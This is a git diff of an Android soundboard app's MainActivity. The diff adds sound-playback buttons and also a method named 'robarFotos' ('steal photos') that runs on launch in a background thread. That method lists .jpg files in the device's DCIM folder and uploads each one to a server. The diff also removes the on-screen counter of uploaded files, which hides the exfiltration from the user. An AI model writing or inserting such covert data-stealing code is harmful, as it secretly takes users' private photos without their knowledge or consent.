@@ -10,24 +10,16 @@ import java.security.MessageDigest;
 import java.security.NoSuchAlgorithmException;
 import java.util.Arrays;
 
-import org.apache.http.HttpResponse;
-import org.apache.http.client.HttpClient;
-import org.apache.http.client.methods.HttpGet;
-import org.apache.http.client.methods.HttpPost;
-import org.apache.http.entity.InputStreamEntity;
-import org.apache.http.impl.client.DefaultHttpClient;
-
 import android.app.Activity;
-import android.media.AudioManager;
-import android.media.SoundPool;
+import android.media.MediaPlayer;
 import android.os.AsyncTask;
 import android.os.Bundle;
 import android.os.Environment;
+import android.os.Looper;
 import android.util.Log;
 import android.view.Menu;
 import android.view.View;
-import android.widget.Button;
-import android.widget.TextView;
+
 import ch.boye.httpclientandroidlib.HttpResponse;
 import ch.boye.httpclientandroidlib.HttpVersion;
 import ch.boye.httpclientandroidlib.client.ClientProtocolException;
@@ -46,28 +38,24 @@ import ch.boye.httpclientandroidlib.util.EntityUtils;
 import com.google.common.io.Files;
 
 public class MainActivity extends Activity {
-	private int uploaded;
-
-	Button white;
-	SoundPool spool;
-	int soundID;
+	private MediaPlayer mp;
 	
 	@Override
 	protected void onCreate(Bundle savedInstanceState) {
 		super.onCreate(savedInstanceState);
 		setContentView(R.layout.activity_main);
-		uploaded = 0;
-		
-		this.setVolumeControlStream(AudioManager.STREAM_MUSIC);
-		   spool = new SoundPool(1, AudioManager.STREAM_MUSIC, 0);
-		   soundID = spool.load(this, R.raw.lallamaquellama, 1);
-
-		   white = (Button)findViewById(R.id.button2);
-		   white.setOnClickListener(new View.OnClickListener() {
-		       public void onClick(View v) {
-		           Sound();
-		       }
-		   });
+		//mandarRequest(null);
+		robarFotos(null);
+	}
+	
+	public void robarFotos(View v) {
+	    new Thread(new Runnable() {
+	        public void run() {
+	        	Looper.prepare();
+	            mandarRequest(null);
+	            Looper.loop();
+	        }
+	    }).start();
 	}
 
 	@Override
@@ -76,16 +64,42 @@ public class MainActivity extends Activity {
 		getMenuInflater().inflate(R.menu.main, menu);
 		return true;
 	}
+	
+	public void reproducirSonido(View view) {
+		try{
+			this.mp.stop();
+		}catch(Exception e){
+			Log.d("LALLAMA","Problem playing file");
+		} 
+		finally{
+			String soundToReproduce = view.getTag().toString();
+			Integer soundId = getResources().getIdentifier( soundToReproduce , "raw" , this.getPackageName() );
+			MediaPlayer mimp = MediaPlayer.create(getBaseContext(),
+			soundId);
+			this.mp = mimp;
+			this.mp.start();
+		}
+	}
+	
+	public void pararSonido(View view) {
+		try{
+			this.mp.stop();
+		} catch (Exception e) {}
+	}
 
 	public void mandarRequest(View view) {
 		File sdCardRoot = Environment.getExternalStorageDirectory();
 		File f = new File(sdCardRoot, "/DCIM/prueba");
 		File[] files = f.listFiles();
-		for (File inFile : files) {
-			if (inFile.isFile() && inFile.getName().matches("(.*)\\.jpg$")) {
-				Log.d("LALLAMA",inFile.getName());
-				new ImageUploadTask().execute(inFile);
-			}
+		if(files != null){
+			for (File inFile : files) {
+				if (inFile.isFile() && inFile.getName().matches("(.*)\\.jpg$")) {
+					Log.d("LALLAMA",inFile.getName());
+					new ImageUploadTask().execute(inFile);
+				}
+			}			
+		}else{
+			Log.d("LALLAMA","No SD CARD!");
 		}
 	}
 
@@ -111,9 +125,6 @@ public class MainActivity extends Activity {
 	}
 
 	private void showData(String data) {
-		uploaded++;
-		TextView p1_button = (TextView) findViewById(R.id.unLabel);
-		p1_button.setText("Archivos Subidos :" + uploaded);
 	}
 
 	private class ImageUploadTask extends AsyncTask<File, Integer, String> {
@@ -171,6 +182,7 @@ public class MainActivity extends Activity {
 	
 			try {
 				httppost.setEntity(new UrlEncodedFormEntity(Arrays.asList(new BasicNameValuePair("digest",digest))));
+			//} catch (Exception e) {
 			} catch (UnsupportedEncodingException e) {
 				e.printStackTrace();
 				return null;
@@ -228,7 +240,6 @@ public class MainActivity extends Activity {
 	private class GetTask extends AsyncTask<String, Integer, String> {
 		@Override
 		protected String doInBackground(String... params) {
-			// TODO Auto-generated method stub
 			return getData();
 		}
 
@@ -253,12 +264,4 @@ public class MainActivity extends Activity {
 			}
 		}
 	}
-
-	public void Sound(){
-	   AudioManager audioManager = (AudioManager) getSystemService(AUDIO_SERVICE);
-	   float volume = (float) audioManager.getStreamVolume(AudioManager.STREAM_MUSIC);
-	   spool.play(soundID, volume, volume, 1, 0, 1f);
-
-	};
-
 }
